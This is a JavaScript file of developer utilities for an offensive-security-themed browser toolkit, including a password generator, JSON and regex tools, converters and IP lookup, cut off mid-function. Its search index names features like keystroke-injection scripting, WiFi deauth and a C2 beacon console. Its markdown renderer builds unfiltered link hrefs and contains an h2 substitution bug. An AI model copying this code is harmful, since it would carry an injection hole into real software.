// ================================================================
// LENLU SC FORGE v5.0 — NEW FEATURES SCRIPT
// Append this to your main JS file or include as <script src="forge-new.js">
// ================================================================

'use strict';



// ================================================================
// 2. PASSWORD GENERATOR — Cryptographically secure
// ================================================================
window.generatePasswords = function () {
  const len = parseInt(document.getElementById('pwdLength')?.value) || 20;
  const useUpper = document.getElementById('pwdUpper')?.checked;
  const useLower = document.getElementById('pwdLower')?.checked;
  const useNums = document.getElementById('pwdNums')?.checked;
  const useSyms = document.getElementById('pwdSyms')?.checked;
  const count = parseInt(document.getElementById('pwdCount')?.value) || 5;

  let charset = '';
  if (useUpper) charset += 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
  if (useLower) charset += 'abcdefghijklmnopqrstuvwxyz';
  if (useNums) charset += '0123456789';
  if (useSyms) charset += '!@#$%^&*()_+-=[]{}|;:,.<>?';

  if (!charset) { charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'; }

  const results = document.getElementById('pwdResults');
  if (!results) return;
  results.innerHTML = '';

  for (let i = 0; i < count; i++) {
    const arr = new Uint32Array(len);
    crypto.getRandomValues(arr);
    const pwd = Array.from(arr).map(v => charset[v % charset.length]).join('');

    const entropy = Math.floor(len * Math.log2(charset.length));
    const strength = entropy < 40 ? 'WEAK' : entropy < 60 ? 'FAIR' : entropy < 80 ? 'GOOD' : 'STRONG';
    const color = entropy < 40 ? 'var(--red)' : entropy < 60 ? 'var(--amber)' : entropy < 80 ? 'var(--cyan)' : 'var(--g)';

    const row = document.createElement('div');
    row.className = 'vault-item flex items-center justify-between';
    row.innerHTML = `
      <code style="flex:1;font-size:.72rem;word-break:break-all;color:var(--white)">${pwd}</code>
      <div class="flex gap-xs items-center" style="margin-left:.5rem;flex-shrink:0">
        <span style="font-family:var(--font-hud);font-size:.56rem;color:${color}">${strength}</span>
        <span class="text-muted text-xs">${entropy}b</span>
        <button class="btn btn-ghost btn-xs" onclick="copyText('${pwd}','Password copied')"><i class="fas fa-copy"></i></button>
      </div>`;
    results.appendChild(row);
  }

  if (typeof toast === 'function') toast(`${count} passwords generated`, 'ok');
};

window.copyPwd = function (text) { copyText(text, 'Password copied'); };

// ================================================================
// 3. JSON FORMATTER — Pretty print, minify, validate, diff
// ================================================================
window.formatJSON = function () {
  const input = document.getElementById('jsonInput')?.value || '';
  const output = document.getElementById('jsonOutput');
  const status = document.getElementById('jsonStatus');
  if (!output || !input.trim()) return;

  try {
    const parsed = JSON.parse(input);
    const indent = parseInt(document.getElementById('jsonIndent')?.value) || 2;
    const pretty = JSON.stringify(parsed, null, indent);
    output.textContent = pretty;
    if (status) {
      status.textContent = `✓ Valid JSON — ${Object.keys(parsed).length || (Array.isArray(parsed) ? parsed.length : 0)} keys, ${pretty.length} chars`;
      status.style.color = 'var(--g)';
    }
    if (typeof toast === 'function') toast('JSON formatted', 'ok');
  } catch (e) {
    if (status) {
      status.textContent = `✗ Parse Error: ${e.message}`;
      status.style.color = 'var(--red)';
    }
    if (typeof toast === 'function') toast('Invalid JSON: ' + e.message, 'err');
  }
};

window.minifyJSON = function () {
  const input = document.getElementById('jsonInput')?.value || '';
  const output = document.getElementById('jsonOutput');
  if (!output || !input.trim()) return;
  try {
    output.textContent = JSON.stringify(JSON.parse(input));
    if (typeof toast === 'function') toast('JSON minified', 'ok');
  } catch (e) {
    if (typeof toast === 'function') toast('Invalid JSON', 'err');
  }
};

window.copyJSON = function () {
  const out = document.getElementById('jsonOutput')?.textContent || '';
  if (out) copyText(out, 'JSON copied');
};

// ================================================================
// 4. REGEX TESTER — Live matching with highlight
// ================================================================
window.testRegex = function () {
  const pattern = document.getElementById('regexPattern')?.value || '';
  const flags = document.getElementById('regexFlags')?.value || 'g';
  const testStr = document.getElementById('regexTest')?.value || '';
  const output = document.getElementById('regexOutput');
  const matchList = document.getElementById('regexMatches');
  if (!output || !matchList) return;

  if (!pattern) {
    output.innerHTML = `<span style="color:var(--muted)">${escapeHtml(testStr)}</span>`;
    matchList.textContent = '// Enter a pattern to test';
    return;
  }

  try {
    const re = new RegExp(pattern, flags);
    const matches = [];
    let match;
    const cloneRe = new RegExp(pattern, flags);

    if (flags.includes('g') || flags.includes('y')) {
      while ((match = cloneRe.exec(testStr)) !== null) {
        matches.push({ index: match.index, value: match[0], groups: match.groups });
        if (match[0].length === 0) cloneRe.lastIndex++;
      }
    } else {
      match = cloneRe.exec(testStr);
      if (match) matches.push({ index: match.index, value: match[0], groups: match.groups });
    }

    // Highlight matches
    let highlighted = escapeHtml(testStr);
    if (matches.length) {
      let offset = 0;
      let result = '';
      let pos = 0;
      for (const m of matches) {
        result += escapeHtml(testStr.slice(pos, m.index));
        result += `<span style="background:rgba(0,255,65,.25);color:var(--g);border-radius:2px;padding:0 1px">${escapeHtml(m.value)}</span>`;
        pos = m.index + m.value.length;
      }
      result += escapeHtml(testStr.slice(pos));
      highlighted = result;
    }
    output.innerHTML = highlighted || `<span style="color:var(--muted)">// No test string</span>`;

    matchList.innerHTML = matches.length
      ? matches.map((m, i) => `<div class="tl-line tl-ok">Match ${i + 1}: <code>"${escapeHtml(m.value)}"</code> @ index ${m.index}</div>`).join('')
      : `<div class="tl-line tl-warn">// No matches found</div>`;

    const statusEl = document.getElementById('regexStatus');
    if (statusEl) {
      statusEl.textContent = `${matches.length} match${matches.length !== 1 ? 'es' : ''} found`;
      statusEl.style.color = matches.length ? 'var(--g)' : 'var(--amber)';
    }
  } catch (e) {
    output.textContent = testStr;
    matchList.innerHTML = `<div class="tl-line tl-err">Invalid regex: ${e.message}</div>`;
    if (typeof toast === 'function') toast('Invalid regex: ' + e.message, 'err');
  }
};

function escapeHtml(str) {
  return str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
}

// ================================================================
// 5. TIMESTAMP CONVERTER
// ================================================================
window.convertTimestamp = function () {
  const input = document.getElementById('tsInput')?.value?.trim() || '';
  const output = document.getElementById('tsOutput');
  if (!output) return;

  let ts;
  if (/^\d{10}$/.test(input)) ts = parseInt(input) * 1000;
  else if (/^\d{13}$/.test(input)) ts = parseInt(input);
  else ts = Date.parse(input);

  if (isNaN(ts)) {
    output.innerHTML = `<div class="tl-line tl-err">✗ Invalid timestamp or date string</div>`;
    return;
  }

  const d = new Date(ts);
  const rows = [
    ['Unix (sec)', Math.floor(ts / 1000)],
    ['Unix (ms)', ts],
    ['ISO 8601', d.toISOString()],
    ['UTC String', d.toUTCString()],
    ['Local', d.toLocaleString()],
    ['Date Only', d.toDateString()],
    ['Time Only', d.toTimeString()],
    ['Relative', (() => {
      const diff = Date.now() - ts;
      const abs = Math.abs(diff);
      const suffix = diff > 0 ? 'ago' : 'from now';
      if (abs < 60000) return `${Math.floor(abs / 1000)}s ${suffix}`;
      if (abs < 3600000) return `${Math.floor(abs / 60000)}m ${suffix}`;
      if (abs < 86400000) return `${Math.floor(abs / 3600000)}h ${suffix}`;
      return `${Math.floor(abs / 86400000)}d ${suffix}`;
    })()],
  ];

  output.innerHTML = rows.map(([k, v]) =>
    `<div class="flex justify-between tl-line" style="gap:.5rem">
       <span class="text-muted" style="flex-shrink:0">${k}:</span>
       <code style="color:var(--g);cursor:pointer;word-break:break-all" onclick="copyText('${v}','Copied')">${v}</code>
     </div>`
  ).join('');
};

window.setNowTimestamp = function () {
  const inp = document.getElementById('tsInput');
  if (inp) { inp.value = Date.now(); window.convertTimestamp(); }
};

// ================================================================
// 6. HTTP HEADERS INSPECTOR
// ================================================================
window.inspectHeaders = async function () {
  const url = document.getElementById('headersUrl')?.value?.trim() || '';
  const output = document.getElementById('headersOutput');
  if (!output || !url) return;

  output.innerHTML = `<div class="tl-line tl-sys"><span class="scan-spinner" style="display:inline-block"></span> Fetching headers for ${escapeHtml(url)}…</div>`;

  try {
    // Use a CORS proxy or a DoH endpoint to demonstrate
    const target = url.startsWith('http') ? url : 'https://' + url;

    // Try direct fetch (will work for same-origin or CORS-enabled endpoints)
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 5000);

    try {
      const resp = await fetch(target, { method: 'HEAD', signal: controller.signal, mode: 'no-cors' });
      clearTimeout(timeout);
      // no-cors won't give us headers but at least we can confirm connectivity
      output.innerHTML = `
        <div class="tl-line tl-ok">✓ Connection established to ${escapeHtml(target)}</div>
        <div class="tl-line tl-warn">⚠ CORS policy prevents reading response headers in browser</div>
        <div class="tl-line tl-info">Status: ${resp.status || 'opaque (no-cors mode)'}</div>
        <div class="tl-line tl-sys">─────────────────────────────────────────</div>
        <div class="tl-line tl-sys">Browser Security Note:</div>
        <div class="tl-line tl-sys">Direct header inspection requires server CORS headers or a proxy.</div>
        <div class="tl-line tl-sys">Use curl/wget for full header inspection:</div>
        <div class="tl-line tl-ok">$ curl -I ${escapeHtml(target)}</div>
        <div class="tl-line tl-ok">$ wget --server-response --spider ${escapeHtml(target)}</div>`;
    } catch (fetchErr) {
      clearTimeout(timeout);
      output.innerHTML = `
        <div class="tl-line tl-warn">⚠ Could not connect: ${escapeHtml(fetchErr.message)}</div>
        <div class="tl-line tl-sys">Try the curl command instead:</div>
        <div class="tl-line tl-ok">$ curl -I ${escapeHtml(target)}</div>`;
    }
  } catch (e) {
    output.innerHTML = `<div class="tl-line tl-err">Error: ${escapeHtml(e.message)}</div>`;
  }
};

// ================================================================
// 7. BASE64 IMAGE CONVERTER
// ================================================================
window.handleImageB64 = function (input) {
  const file = input.files[0];
  if (!file) return;

  const reader = new FileReader();
  reader.onload = (e) => {
    const b64 = e.target.result;
    const txtArea = document.getElementById('imgB64Output');
    const preview = document.getElementById('imgPreview');
    const info = document.getElementById('imgInfo');

    if (txtArea) txtArea.value = b64;
    if (preview) { preview.src = b64; preview.style.display = 'block'; }
    if (info) {
      info.textContent = `${file.name} · ${file.type} · ${(file.size / 1024).toFixed(1)}KB · Base64: ${Math.ceil(b64.length / 1024)}KB`;
    }
  };
  reader.readAsDataURL(file);
};

window.b64ToImage = function () {
  const b64 = document.getElementById('imgB64Input')?.value?.trim() || '';
  const preview = document.getElementById('imgPreviewB64');
  if (!b64 || !preview) return;
  preview.src = b64.startsWith('data:') ? b64 : `data:image/png;base64,${b64}`;
  preview.style.display = 'block';
  preview.onerror = () => { if (typeof toast === 'function') toast('Invalid base64 image data', 'err'); };
};

window.copyImgB64 = function () {
  const val = document.getElementById('imgB64Output')?.value || '';
  if (val) copyText(val, 'Base64 string copied');
};

window.downloadImgB64 = function () {
  const b64 = document.getElementById('imgB64Output')?.value || '';
  if (!b64) return;
  const a = document.createElement('a');
  a.href = b64;
  a.download = 'image_base64.png';
  a.click();
};

// ================================================================
// 8. COLOR PICKER & CONVERTER
// ================================================================
window.updateColorPicker = function (hex) {
  const hexInput = document.getElementById('colorHex');
  const rgbOutput = document.getElementById('colorRgb');
  const hslOutput = document.getElementById('colorHsl');
  const previewBig = document.getElementById('colorPreviewBig');
  const cmykOutput = document.getElementById('colorCmyk');

  if (!hex) hex = hexInput?.value || '#00ff41';
  if (!hex.startsWith('#')) hex = '#' + hex;

  // Hex to RGB
  const r = parseInt(hex.slice(1, 3), 16);
  const g = parseInt(hex.slice(3, 5), 16);
  const b = parseInt(hex.slice(5, 7), 16);
  if (isNaN(r) || isNaN(g) || isNaN(b)) return;

  // RGB to HSL
  const rn = r / 255, gn = g / 255, bn = b / 255;
  const max = Math.max(rn, gn, bn), min = Math.min(rn, gn, bn);
  let h, s, l = (max + min) / 2;
  if (max === min) { h = s = 0; }
  else {
    const d = max - min;
    s = l > 0.5 ? d / (2 - max - min) : d / (max + min);
    switch (max) {
      case rn: h = ((gn - bn) / d + (gn < bn ? 6 : 0)) / 6; break;
      case gn: h = ((bn - rn) / d + 2) / 6; break;
      case bn: h = ((rn - gn) / d + 4) / 6; break;
    }
  }

  // RGB to CMYK
  const k = 1 - Math.max(rn, gn, bn);
  const c2 = k < 1 ? (1 - rn - k) / (1 - k) : 0;
  const m2 = k < 1 ? (1 - gn - k) / (1 - k) : 0;
  const y2 = k < 1 ? (1 - bn - k) / (1 - k) : 0;

  if (rgbOutput) rgbOutput.textContent = `rgb(${r}, ${g}, ${b})`;
  if (hslOutput) hslOutput.textContent = `hsl(${Math.round(h * 360)}, ${Math.round(s * 100)}%, ${Math.round(l * 100)}%)`;
  if (cmykOutput) cmykOutput.textContent = `cmyk(${Math.round(c2 * 100)}%, ${Math.round(m2 * 100)}%, ${Math.round(y2 * 100)}%, ${Math.round(k * 100)}%)`;
  if (previewBig) previewBig.style.background = hex;
  if (hexInput && hexInput.value !== hex) hexInput.value = hex;

  // Update contrast info
  const lum = 0.2126 * Math.pow(rn, 2.2) + 0.7152 * Math.pow(gn, 2.2) + 0.0722 * Math.pow(bn, 2.2);
  const contrastWhite = (1.05) / (lum + 0.05);
  const contrastBlack = (lum + 0.05) / (0.05);
  const contrastEl = document.getElementById('colorContrast');
  if (contrastEl) {
    contrastEl.innerHTML = `
      <div>vs White: <strong style="color:${contrastWhite >= 4.5 ? 'var(--g)' : 'var(--red)'}">${contrastWhite.toFixed(1)}:1</strong> ${contrastWhite >= 4.5 ? '✓ AA' : '✗ Fail'}</div>
      <div>vs Black: <strong style="color:${contrastBlack >= 4.5 ? 'var(--g)' : 'var(--red)'}">${contrastBlack.toFixed(1)}:1</strong> ${contrastBlack >= 4.5 ? '✓ AA' : '✗ Fail'}</div>`;
  }
};

window.generateColorPalette = function () {
  const hex = document.getElementById('colorHex')?.value || '#00ff41';
  const palette = document.getElementById('colorPalette');
  if (!palette) return;

  const r = parseInt(hex.slice(1, 3), 16);
  const g = parseInt(hex.slice(3, 5), 16);
  const b = parseInt(hex.slice(5, 7), 16);

  const shades = [];
  for (let i = 0; i <= 10; i++) {
    const t = i / 10;
    const nr = Math.round(r + (255 - r) * t * (0.7));
    const ng = Math.round(g + (255 - g) * t * (0.7));
    const nb = Math.round(b + (255 - b) * t * (0.7));
    const darkR = Math.round(r * (1 - t * 0.8));
    const darkG = Math.round(g * (1 - t * 0.8));
    const darkB = Math.round(b * (1 - t * 0.8));
    if (i < 5) shades.push(`#${darkR.toString(16).padStart(2, '0')}${darkG.toString(16).padStart(2, '0')}${darkB.toString(16).padStart(2, '0')}`);
    else shades.push(`#${nr.toString(16).padStart(2, '0')}${ng.toString(16).padStart(2, '0')}${nb.toString(16).padStart(2, '0')}`);
  }

  palette.innerHTML = shades.map(c =>
    `<div style="background:${c};height:48px;cursor:pointer;border-radius:2px;display:flex;align-items:flex-end;padding:2px" title="${c}" onclick="copyText('${c}','Color copied'); updateColorPicker('${c}')">
      <span style="font-size:.48rem;font-family:monospace;color:rgba(255,255,255,.7)">${c}</span>
    </div>`
  ).join('');
};

// ================================================================
// 9. URL ENCODER/DECODER (standalone tool)
// ================================================================
window.encodeURL = function () {
  const inp = document.getElementById('urlInput')?.value || '';
  const out = document.getElementById('urlOutput');
  if (out) out.value = encodeURIComponent(inp);
};

window.decodeURL = function () {
  const inp = document.getElementById('urlInput')?.value || '';
  const out = document.getElementById('urlOutput');
  try {
    if (out) out.value = decodeURIComponent(inp);
  } catch (e) {
    if (typeof toast === 'function') toast('Invalid URL encoding', 'err');
  }
};

// ================================================================
// 10. MARKDOWN PREVIEWER
// ================================================================
window.renderMarkdown = function () {
  const input = document.getElementById('mdInput')?.value || '';
  const output = document.getElementById('mdOutput');
  if (!output) return;

  // Basic Markdown parser
  let html = input
    .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
    .replace(/^# (.+)$/gm, '<h1 style="color:var(--g);font-family:var(--font-display);margin:.8rem 0 .4rem">$1</h1>')
    .replace(/^## (.+)$/gm, '<h2 style="color:var(--white);margin:.7rem 0 .3rem">$2</h2>')
    .replace(/^### (.+)$/gm, '<h3 style="color:var(--cyan);margin:.6rem 0 .25rem">$1</h3>')
    .replace(/\*\*(.+?)\*\*/g, '<strong>$1</strong>')
    .replace(/\*(.+?)\*/g, '<em>$1</em>')
    .replace(/`(.+?)`/g, '<code style="background:rgba(0,255,65,.1);color:var(--g);padding:1px 4px;border-radius:2px">$1</code>')
    .replace(/\[(.+?)\]\((.+?)\)/g, '<a href="$2" style="color:var(--cyan)" target="_blank">$1</a>')
    .replace(/^> (.+)$/gm, '<blockquote style="border-left:3px solid var(--g);padding-left:.75rem;color:var(--muted);margin:.5rem 0">$1</blockquote>')
    .replace(/^---$/gm, '<hr style="border:none;border-top:1px solid var(--gbord);margin:.75rem 0">')
    .replace(/^- (.+)$/gm, '<li style="margin:.2rem 0;list-style:disc;margin-left:1.2rem">$1</li>')
    .replace(/^\d+\. (.+)$/gm, '<li style="margin:.2rem 0;list-style:decimal;margin-left:1.2rem">$1</li>')
    .replace(/\n\n/g, '<br><br>')
    .replace(/\n/g, '<br>');

  output.innerHTML = html;
  if (typeof toast === 'function') toast('Markdown rendered', 'ok');
};

// ================================================================
// 11. YAML ↔ JSON CONVERTER
// ================================================================
window.convertYamlJson = function (direction) {
  const input = document.getElementById('yamlInput')?.value?.trim() || '';
  const output = document.getElementById('yamlOutput');
  if (!output || !input) return;

  if (direction === 'yaml2json') {
    try {
      // Basic YAML to JSON (handles simple key:value and lists)
      const lines = input.split('\n');
      const obj = {};
      let currentKey = null;
      let currentArr = null;

      lines.forEach(line => {
        const trimmed = line.trim();
        if (!trimmed || trimmed.startsWith('#')) return;

        if (trimmed.startsWith('- ')) {
          if (currentKey && !Array.isArray(obj[currentKey])) obj[currentKey] = [];
          if (currentKey) (obj[currentKey]).push(trimmed.slice(2));
        } else {
          const colonIdx = trimmed.indexOf(':');
          if (colonIdx > 0) {
            const k = trimmed.slice(0, colonIdx).trim();
            const v = trimmed.slice(colonIdx + 1).trim();
            currentKey = k;
            if (v) {
              const num = Number(v);
              obj[k] = v === 'true' ? true : v === 'false' ? false : v === 'null' ? null : !isNaN(num) && v !== '' ? num : v.replace(/^["']|["']$/g, '');
            } else {
              obj[k] = null;
            }
          }
        }
      });

      output.value = JSON.stringify(obj, null, 2);
      if (typeof toast === 'function') toast('YAML → JSON converted', 'ok');
    } catch (e) {
      if (typeof toast === 'function') toast('Conversion error: ' + e.message, 'err');
    }
  } else {
    try {
      const obj = JSON.parse(input);
      const toYaml = (o, indent = 0) => {
        const pad = ' '.repeat(indent);
        if (Array.isArray(o)) return o.map(v => `${pad}- ${typeof v === 'object' ? '\n' + toYaml(v, indent + 2) : v}`).join('\n');
        if (typeof o === 'object' && o !== null) return Object.entries(o).map(([k, v]) =>
          typeof v === 'object' ? `${pad}${k}:\n${toYaml(v, indent + 2)}` : `${pad}${k}: ${v}`
        ).join('\n');
        return String(o);
      };
      output.value = toYaml(obj);
      if (typeof toast === 'function') toast('JSON → YAML converted', 'ok');
    } catch (e) {
      if (typeof toast === 'function') toast('Invalid JSON: ' + e.message, 'err');
    }
  }
};

// ================================================================
// 12. CRON EXPRESSION PARSER
// ================================================================
window.parseCron = function () {
  const expr = document.getElementById('cronInput')?.value?.trim() || '';
  const output = document.getElementById('cronOutput');
  if (!output) return;

  const parts = expr.split(/\s+/);
  if (parts.length < 5 || parts.length > 6) {
    output.textContent = '✗ Invalid: Cron needs 5 or 6 parts (min hour day mon weekday [year])';
    return;
  }

  const labels = ['Minute', 'Hour', 'Day (month)', 'Month', 'Day (week)', 'Year'];
  const descriptions = parts.map((p, i) => {
    const lbl = labels[i] || labels[i];
    if (p === '*') return `${lbl}: Every`;
    if (p.includes('/')) { const [, step] = p.split('/'); return `${lbl}: Every ${step}`; }
    if (p.includes('-')) { const [a, b] = p.split('-'); return `${lbl}: From ${a} to ${b}`; }
    if (p.includes(',')) return `${lbl}: At ${p.split(',').join(', ')}`;
    return `${lbl}: At ${p}`;
  });

  const humanReadable = {
    '0 * * * *': 'At minute 0 of every hour',
    '*/5 * * * *': 'Every 5 minutes',
    '0 0 * * *': 'Every day at midnight',
    '0 9 * * 1-5': 'Weekdays at 9 AM',
    '0 0 1 * *': 'First day of every month at midnight',
    '0 0 * * 0': 'Every Sunday at midnight',
    '@hourly': 'Every hour at minute 0',
    '@daily': 'Once a day at midnight',
    '@weekly': 'Once a week on Sunday midnight',
    '@monthly': 'Once a month on 1st at midnight',
    '@yearly': 'Once a year on Jan 1st midnight',
  };

  const known = humanReadable[expr];
  output.innerHTML = `
    <div class="tl-line tl-ok" style="font-size:.8rem;margin-bottom:.5rem">${known || descriptions.join(' • ')}</div>
    ${descriptions.map(d => `<div class="tl-line tl-sys">${d}</div>`).join('')}
    <div class="tl-line tl-info" style="margin-top:.5rem">Expression: <code>${escapeHtml(expr)}</code></div>`;
};

// ================================================================
// 13. IP GEOLOCATION LOOKUP
// ================================================================
window.geoLookupIP = async function () {
  const ip = document.getElementById('geoIpInput')?.value?.trim() || '';
  const output = document.getElementById('geoOutput');
  if (!output) return;

  output.innerHTML = `<div class="tl-line tl-sys">Looking up ${ip || 'your IP'}…</div>`;

  try {
    const url = ip ? `https://ipapi.co/${ip}/json/` : 'https://ipapi.co/json/';
    const resp = await fetch(url);
    if (!resp.ok) throw new Error('API returned ' + resp.status);
    const data = await resp.json();

    if (data.error) throw new Error(data.reason || 'Lookup failed');

    const fields = [
      ['IP', data.ip], ['City', data.city], ['Region', data.region],
      ['Country', `${data.country_name} (${data.country})`],
      ['Continent', data.continent_code], ['Latitude', data.latitude],
      ['Longitude', data.longitude], ['Timezone', data.timezone],
      ['ISP', data.org], ['ASN', data.asn],
      ['Currency', data.currency], ['Languages', data.languages],
    ];

    output.innerHTML = fields.map(([k, v]) => v ?
      `<div class="flex justify-between tl-line" style="gap:.5rem">
         <span class="text-muted" style="flex-shrink:0;min-width:90px">${k}:</span>
         <span style="color:var(--g);text-align:right">${escapeHtml(String(v))}</span>
       </div>` : ''
    ).join('');

    if (typeof toast === 'function') toast(`Geo lookup: ${data.city}, ${data.country_name}`, 'ok');
  } catch (e) {
    output.innerHTML = `<div class="tl-line tl-err">✗ ${escapeHtml(e.message)}</div>`;
    if (typeof toast === 'function') toast('Geo lookup failed: ' + e.message, 'err');
  }
};

// ================================================================
// 14. NUMBER BASE CONVERTER
// ================================================================
window.convertBase = function () {
  const input = document.getElementById('baseInput')?.value?.trim() || '';
  const fromBase = parseInt(document.getElementById('baseFrom')?.value) || 10;

  const fields = {
    'baseOutBin': 2, 'baseOutOct': 8, 'baseOutDec': 10, 'baseOutHex': 16
  };

  try {
    const num = parseInt(input, fromBase);
    if (isNaN(num)) throw new Error('Invalid number for base ' + fromBase);

    Object.entries(fields).forEach(([id, base]) => {
      const el = document.getElementById(id);
      if (el) el.textContent = num.toString(base).toUpperCase();
    });

    // Show bit representation
    const bits = document.getElementById('baseBits');
    if (bits) {
      const b = num.toString(2).padStart(Math.ceil(num.toString(2).length / 8) * 8, '0');
      bits.textContent = b.match(/.{1,8}/g)?.join(' ') || b;
    }
  } catch (e) {
    if (typeof toast === 'function') toast(e.message, 'err');
  }
};

// ================================================================
// 15. SEARCH FUNCTION — Global search across all views
// ================================================================
window.globalSearch = function (query) {
  const q = (query || document.getElementById('globalSearchInput')?.value || '').toLowerCase().trim();
  const resultsEl = document.getElementById('globalSearchResults');
  if (!resultsEl || !q) return;

  const searchMap = [
    { view: 'compiler', name: 'IDE Compiler', desc: 'DuckyScript editor, compile, lint, hex dump' },
    { view: 'neural', name: 'Neural AI Lab', desc: 'AI-powered script generation, chat, voice' },
    { view: 'scanner', name: 'Scanner', desc: 'WiFi, BLE, deauth, port scan, spectrum' },
    { view: 'network', name: 'Network', desc: 'DNS lookup, WebRTC, latency, network info' },
    { view: 'encoder', name: 'Encoder', desc: 'Base64, hex, URL, rot13, morse, binstr' },
    { view: 'keymap', name: 'Keymap Visualizer', desc: 'Virtual keyboard, replay, step mode' },
    { view: 'osint', name: 'OSINT Fingerprint', desc: 'Browser fingerprint, canvas hash, WebGL' },
    { view: 'vault', name: 'Vault', desc: 'Saved scripts, encrypt, PDF export' },
    { view: 'crypto', name: 'Crypto Tools', desc: 'SHA hash, RSA, AES demo, hash benchmark' },
    { view: 'mitre', name: 'MITRE ATT&CK', desc: 'Tactics, techniques, mitigations' },
    { view: 'subnets', name: 'Subnet Calculator', desc: 'CIDR, netmask, host range, binary' },
    { view: 'architect', name: 'Network Architect', desc: 'Drag-drop topology, packet simulation' },
    { view: 'speedtest', name: 'Speed Test', desc: 'Download/upload speed, latency, jitter' },
    { view: 'clipboard', name: 'Clipboard', desc: 'Paste, convert to DuckyScript' },
    { view: 'whois', name: 'WHOIS', desc: 'Domain WHOIS lookup' },
    { view: 'diff', name: 'Text Diff', desc: 'Compare two text blocks' },
    { view: 'macro', name: 'Macro Recorder', desc: 'Record keystrokes, generate script' },
    { view: 'audit', name: 'Security Audit', desc: 'Compliance scoring, browser privacy check' },
    { suite: 'sec-suite', tab: 'pwdgen', name: '🆕 Password Generator', desc: 'Cryptographically secure passwords' },
    { suite: 'dev-suite', tab: 'jsonfmt', name: '🆕 JSON Formatter', desc: 'Pretty print, minify, validate JSON' },
    { suite: 'dev-suite', tab: 'regex', name: '🆕 Regex Tester', desc: 'Live regex matching with highlighting' },
    { suite: 'sys-suite', tab: 'timestamp', name: '🆕 Timestamp Converter', desc: 'Unix timestamp, ISO 8601, relative' },
    { suite: 'dev-suite', tab: 'colorpicker', name: '🆕 Color Picker', desc: 'HEX, RGB, HSL, CMYK, contrast ratio' },
    { suite: 'dev-suite', tab: 'markdown', name: '🆕 Markdown Preview', desc: 'Live markdown rendering' },
    { suite: 'sec-suite', tab: 'geoip', name: '🆕 IP Geolocation', desc: 'IP address geolocation lookup' },
    { suite: 'sys-suite', tab: 'baseconv', name: '🆕 Base Converter', desc: 'Binary, octal, decimal, hex converter' },
    { suite: 'dev-suite', tab: 'yamljson', name: '🆕 YAML↔JSON', desc: 'Convert between YAML and JSON' },
    { suite: 'sys-suite', tab: 'cron', name: '🆕 Cron Parser', desc: 'Parse and explain cron expressions' },
    { suite: 'sec-suite', tab: 'headers', name: '🆕 HTTP Headers', desc: 'HTTP request headers inspector' },
    { suite: 'sec-suite', tab: 'imgb64', name: '🆕 Image ↔ Base64', desc: 'Convert images to/from base64 strings' },
    { view: 'terminal', name: 'Shell', desc: 'Interactive shell, history, commands' },
    { view: 'settings', name: 'Settings', desc: 'CRT, particles, interface config' },
    { view: 'dashboard', name: 'Dashboard', desc: 'Stats, activity feed, telemetry' },
    { view: 'c2_hive', name: 'C2 Hive', desc: 'Live beacon management, C2 console' },
  ];

  const results = searchMap.filter(item =>
    item.name.toLowerCase().includes(q) ||
    item.desc.toLowerCase().includes(q) ||
    (item.view && item.view.toLowerCase().includes(q)) ||
    (item.suite && item.suite.toLowerCase().includes(q)) ||
    (item.tab && item.tab.toLowerCase().includes(q))
  );

  if (!results.length) {
    resultsEl.innerHTML = `<div class="text-muted text-xs" style="padding:.5rem">No results for "${escapeHtml(q)}"</div>`;
    return;
  }

  resultsEl.innerHTML = results.map(r => {
    const handler = r.suite 
      ? `switchViewSuite('${r.suite}', '${r.tab}')`
      : `switchView('${r.view}', document.querySelector('[data-view=${r.view}]'))`;
    return `<div class="vault-item flex items-center gap-sm" onclick="${handler};document.getElementById('searchPanel').style.display='none'" style="cursor:pointer">
      <i class="fas fa-arrow-right" style="color:var(--g-dim);font-size:.65rem;flex-shrink:0"></i>
      <div>
        <div style="font-size:.72rem;color:var(--white);font-weight:600">${r.name}</div>
        <div style="font-size:.6rem;color:var(--muted)">${r.desc}</div>
      </div>
    </div>`;
  }).join('');
};

window.toggleSearch = function () {
  const panel = document.getElementById('searchPanel');
  if (!panel) return;
  const isVisible = panel.style.display !== 'none';
  panel.style.display = isVisible ? 'none' : 'block';
  if (!isVisible) {
    setTimeout(() => document.getElementById('globalSearchInput')?.focus(), 50);
  }
};

// ================================================================
// 16. KEYBOARD SHORTCUT EXPANSION
// ================================================================
document.addEventListener('keydown', function (e) {
  // Ctrl+F = global search
  if (e.ctrlKey && e.key === 'f') {
    e.preventDefault();
    window.toggleSearch();
    return;
  }
  // Ctrl+Shift+P = password generator
  if (e.ctrlKey && e.shiftKey && e.key === 'P') {
    e.preventDefault();
    if (typeof window.switchViewSuite === 'function') window.switchViewSuite('sec-suite', 'pwdgen');
    return;
  }
  // Ctrl+Shift+J = JSON formatter
  if (e.ctrlKey && e.shiftKey && e.key === 'J') {
    e.preventDefault();
    if (typeof window.switchViewSuite === 'function') window.switchViewSuite('dev-suite', 'jsonfmt');
    return;
  }
  // Escape = close search
  if (e.key === 'Escape') {
    const panel = document.getElementById('searchPanel');
    if (panel) panel.style.display = 'none';
  }
});

// ================================================================
// 17. AUTO-COMPLETE FOR SCRIPT EDITOR (basic DuckyScript hints)
// ================================================================
window.initEditorAutocomplete = function () {
  const editor = document.getElementById('srcEditor');
  if (!editor) return;

  const keywords = ['DELAY', 'STRING', 'STRINGLN', 'ENTER', 'GUI', 'CTRL', 'ALT', 'SHIFT',
    'TAB', 'ESC', 'DELETE', 'BACKSPACE', 'UP', 'DOWN', 'LEFT', 'RIGHT',
    'F1', 'F2', 'F3', 'F4', 'F5', 'F6', 'F7', 'F8', 'F9', 'F10', 'F11', 'F12',
    'PRINTSCREEN', 'SCROLLLOCK', 'PAUSE', 'INSERT', 'HOME', 'PAGEUP',
    'PAGEDOWN', 'END', 'CAPSLOCK', 'REM', 'REPEAT', 'DEFAULT_DELAY',
    'FUNCTION', 'END_FUNCTION', 'VAR', 'IF', 'ELSE', 'END_IF', 'WHILE', 'END_WHILE'];

  editor.addEventListener('keydown', function (e) {
    if (e.key === 'Tab') {
      e.preventDefault();
      const start = this.selectionStart;
      const end = this.selectionEnd;
      const val = this.value;
      this.value = val.substring(0, start) + '  ' + val.substring(end);
